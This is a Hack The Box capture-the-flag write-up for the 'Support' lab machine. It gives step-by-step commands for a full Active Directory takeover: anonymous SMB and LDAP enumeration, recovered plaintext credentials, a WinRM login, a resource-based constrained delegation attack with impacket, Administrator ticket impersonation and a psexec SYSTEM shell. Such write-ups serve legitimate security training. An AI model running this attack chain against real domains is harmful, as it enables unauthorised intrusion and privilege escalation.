<img src="Pasted image 20240722183950.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
![[Pasted image 20240718210107.png]]

**Nmap Scans**

Nmap Default Scan
![[Pasted image 20240718210155.png]]

Nmap Script and Service Scan
![[Pasted image 20240718210234.png]]

Nmap All Port Scan
![[Pasted image 20240718212801.png]]

DNS Info
```
dig axfr @10.10.11.174 support.htb any
```
![[Pasted image 20240718212738.png]]
added in my hosts file 

Can see SMB Shares
```
smbclient -U '' -L \\\\10.10.11.174\\\\
```
![[Pasted image 20240718210418.png]]

Share support-tools
```
smbclient -N //10.10.11.174/support-tools
```
![[Pasted image 20240718210523.png]]

Downloaded all files to my kali
```
recurse ON
prompt off
mget *
```
![[Pasted image 20240718210927.png]]

Decompiled the userinfo.exe file and found a encrypted password, the decrypted it and did ldap search
```
ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | tee ldapsearch.log
```

Found support's password
![[Pasted image 20240718213409.png]]

Will use Evil-winrm to get a session as support
```
evil-winrm -u support -p Ironside47pleasure40Watchful -i support.htb
```
![[Pasted image 20240718213808.png]]

I can Add machines 
![[Pasted image 20240718215038.png]]

Will add computer
```
impacket-addcomputer support.htb/support -dc-ip 10.10.11.174 -computer-name 'pwned$' -computer-pass 'pwned'
```
![[Pasted image 20240718215111.png]]

Set delegation rights to new computer
```
impacket-rbcd -action write -delegate-from pwned$ -delegate-to dc$ -dc-ip 10.10.11.174 "support.htb/support:Ironside47pleasure40Watchful"
```
![[Pasted image 20240718215208.png]]

TGT ticket to impersonate DC Admin 
```
impacket-getST -spn cifs/dc.support.htb support/pwned\$:'pwned' -impersonate Administrator -dc-ip 10.10.11.174 
```
![[Pasted image 20240718215257.png]]

Will export the ticket to local
```
export KRB5CCNAME=./Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```
![[Pasted image 20240718215347.png]]

Get a shell as NT/Authority
```
impacket-psexec -k -no-pass dc.support.htb -dc-ip 10.10.11.174
```
![[Pasted image 20240718215522.png]]

**User.txt**
![[Pasted image 20240718215724.png]]

**Root.txt**
![[Pasted image 20240718215809.png]]


Done with Support.....:)

